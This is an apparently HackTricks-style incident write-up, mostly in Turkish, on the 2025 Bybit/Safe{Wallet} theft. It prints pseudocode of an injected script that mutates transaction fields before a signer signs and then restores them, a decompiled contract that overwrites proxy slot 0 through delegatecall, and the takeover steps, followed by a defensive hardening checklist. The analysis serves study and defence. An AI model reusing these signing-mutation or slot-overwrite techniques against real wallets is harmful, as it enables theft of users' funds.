# Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Bir cold-wallet theft chain, **Safe{Wallet} web UI üzerindeki bir supply-chain compromise** ile **bir proxy'nin implementation pointer'ını (slot 0) overwrite eden on-chain bir delegatecall primitive** kombinasyonundan oluşuyordu. Temel çıkarımlar:

- Bir dApp signing path'e code inject edebiliyorsa, bir signer'a **attacker-chosen fields üzerinde geçerli bir EIP-712 signature** ürettirebilir ve diğer signer'ların durumdan haberdar olmaması için orijinal UI verilerini geri yükleyebilir.
- Safe proxy'leri `masterCopy` (implementation) değerini **storage slot 0** içinde saklar. Slot 0'a yazan bir contract'a yapılan delegatecall, Safe'i etkili biçimde attacker logic'e “upgrade” eder ve wallet üzerinde tam control sağlar.

## Off-chain: Safe{Wallet} içinde hedefli signing mutation

Manipüle edilmiş bir Safe bundle (`_app-*.js`), belirli Safe + signer address'lerini seçici olarak hedef aldı. Inject edilen logic, signing call'dan hemen önce çalışıyordu:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Attack özellikleri
- **Context-gated**: victim Safe'ler/signers için hard-coded allowlist'ler gürültüyü önledi ve detection olasılığını düşürdü.<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation**: alanlar (`to`, `data`, `operation`, gas), `signTransaction` çağrılmadan hemen önce overwrite edildi ve ardından geri alındı; böylece UI'daki proposal payload'ları zararsız görünürken imzalar attacker payload'ıyla eşleşti.
- **EIP-712 opacity**: wallet'lar structured data gösterdi, ancak nested calldata'yı decode etmedi veya `operation = delegatecall` durumunu vurgulamadı; bu da mutated message'ı effectively blind-signed hâle getirdi.

### Gateway validation relevance
Safe proposal'ları **Safe Client Gateway**'e gönderilir. Hardened checks uygulanmadan önce gateway, UI bunları signing sonrasında yeniden yazdıysa, `safeTxHash`/signature ile JSON body içindeki farklı alanların eşleştiği bir proposal'ı kabul edebiliyordu. Incident sonrasında gateway, hash/signature gönderilen transaction ile eşleşmeyen proposal'ları artık reddediyor. Benzer server-side hash verification, signing-orchestration API'lerinde de uygulanmalıdır.

### 2025 Bybit/Safe incident highlights
- 21 Şubat 2025'teki Bybit cold-wallet drain'i (~401k ETH) aynı pattern'i yeniden kullandı: compromised Safe S3 bundle yalnızca Bybit signers için tetiklendi ve `operation=0` → `1` değişimini yaparak `to` değerini slot 0'a yazan pre-deployed attacker contract'ına yönlendirdi.<sup>[[1]](#references)[[3]](#references)</sup>
- Wayback-cached `_app-52c9031bfa03da47.js`, logic'in Bybit'in Safe'i (`0x1db9…cf4`) ve signer address'leri üzerinden çalıştığını, ardından execution'dan iki dakika sonra clean bundle'a geri dönüldüğünü gösteriyor; bu, “mutate → sign → restore” trick'ini yansıtıyor.<sup>[[1]](#references)[[2]](#references)</sup>
- Malicious contract (ör. `0x9622…c7242`), basit `sweepETH/sweepERC20` function'larının yanı sıra implementation slot'unu yazan bir `transfer(address,uint256)` içeriyordu. `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` execution'ı proxy implementation'ını değiştirdi ve full control sağladı.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: Slot collision üzerinden Delegatecall proxy takeover

Safe proxy'leri **storage slot 0**'da `masterCopy` tutar ve tüm logic'i buna delegate eder. Safe, **`operation = 1` (delegatecall)** desteklediği için imzalanmış herhangi bir transaction arbitrary bir contract'ı hedefleyebilir ve onun code'unu proxy'nin storage context'i içinde çalıştırabilir.<sup>[[3]](#references)</sup>

Bir attacker contract, ERC-20 `transfer(address,uint256)` function'ını taklit etti, ancak bunun yerine `_to` değerini slot 0'a yazdı:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:<sup>[[1]](#references)[[3]](#references)</sup>
1. Victims sign `execTransaction` with `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy validates signatures over these parameters.
3. Proxy delegatecalls into `attackerContract`; the `transfer` body writes slot 0.
4. Slot 0 (`masterCopy`) now points to attacker-controlled logic → **tam cüzdan ele geçirme ve fonların boşaltılması**.

### Guard & sürüm notları (olay sonrası hardening)
- Safes >= v1.3.0 can install a **Guard** to veto `delegatecall` or enforce ACLs on `to`/selectors; Bybit ran v1.1.1, so no Guard hook existed. Upgrading contracts (and re-adding owners) is required to gain this control plane.

## Detection & hardening checklist

- **UI bütünlüğü**: JS assets / SRI pinleyin; bundle farklılıklarını izleyin; signing UI'ını trust boundary'nin bir parçası olarak değerlendirin.
- **Sign-time validation**: **EIP-712 clear-signing** destekli hardware wallets kullanın; `operation` değerini açıkça gösterin ve nested calldata'yı decode edin. `operation = 1` olduğunda, policy izin vermiyorsa signing işlemini reddedin.
- **Server-side hash checks**: Proposals'ı relay eden gateway/service'ler `safeTxHash` değerini yeniden hesaplamalı ve signatures'ın gönderilen fields ile eşleştiğini doğrulamalıdır.
- **Policy/allowlists**: `to`, selectors ve asset types için preflight kuralları uygulayın; incelenip onaylanmış flow'lar dışında delegatecall'ı engelleyin. Fully signed transactions broadcast edilmeden önce internal policy service gerektirin.
- **Contract design**: Kesinlikle gerekli olmadıkça multisig/treasury wallets içinde arbitrary delegatecall sunmaktan kaçının. Upgrade pointers'ı slot 0'dan uzağa yerleştirin veya explicit upgrade logic ve access control ile koruyun.
- **Monitoring**: Treasury funds tutan wallets'tan gerçekleştirilen delegatecall executions ve `operation` değerini tipik `call` patterns'inden değiştiren proposals için alert oluşturun.

## References

- [1] [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [2] [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
